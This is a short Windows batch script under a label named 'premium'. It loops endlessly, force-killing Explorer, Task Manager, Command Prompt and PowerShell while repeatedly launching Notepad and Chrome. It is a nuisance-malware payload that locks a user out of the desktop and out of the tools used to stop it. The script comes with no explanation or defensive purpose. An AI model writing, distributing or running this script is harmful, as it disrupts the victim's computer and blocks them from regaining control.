@echo off

:premium
taskkill /f /im explorer.exe
taskkill /f /im taskmgr.exe
taskkill /f /im cmd.exe
taskkill /f /im powershell.exe
start notepad.exe
start chrome.exe
goto premium